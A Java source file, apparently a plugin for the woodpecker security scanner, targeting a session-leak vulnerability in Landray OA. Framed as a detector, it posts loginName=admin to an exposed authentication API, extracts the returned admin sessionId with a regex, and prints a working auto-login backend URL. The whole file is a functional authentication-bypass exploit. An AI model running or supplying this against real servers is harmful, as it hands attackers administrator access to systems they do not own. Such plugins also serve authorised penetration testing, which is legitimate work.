package plugins.detector.landray;

import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.plugin.ITarget;
import me.gv7.woodpecker.plugin.InfoDetector;
import me.gv7.woodpecker.requests.Parameter;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class LandrayOAInfoDetector implements InfoDetector {
    @Override
    public String getInfoDetectorTabCaption() {
        return "历史漏洞探测";
    }

    @Override
    public IArgsUsageBinder getInfoDetectorCustomArgs() {
        return null;
    }

    @Override
    public LinkedHashMap<String, String> doDetect(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        return  detectSessionInfo(iTarget,iResultOutput);
    }

    public LinkedHashMap<String,String> detectSessionInfo(ITarget target, IResultOutput resultOutput){
        String url = target.getAddress() + "/api///sys-authentication/loginService/getLoginSessionId.html";
        RawResponse response = Requests.post(url)
                .body(Parameter.of("loginName","admin"))
                .send();
        String text = response.readToText();
        if (text.contains("sessionId")){
            resultOutput.successPrintln("存在session泄露漏洞");
            Pattern pattern = Pattern.compile("\"sessionId\":\"(.*?)\"}");
            Matcher matcher = pattern.matcher(text);
            if (matcher.find()){
                String sessionId = matcher.group(1);
                resultOutput.infoPrintln(String.format("后台入口: %s", target.getAddress()+"/sys/authentication/sso/login_auto.jsp?sessionId="+sessionId));
            }

        } else {
            resultOutput.failPrintln("不存在session泄露漏洞");
        }

        return null;
    }
}
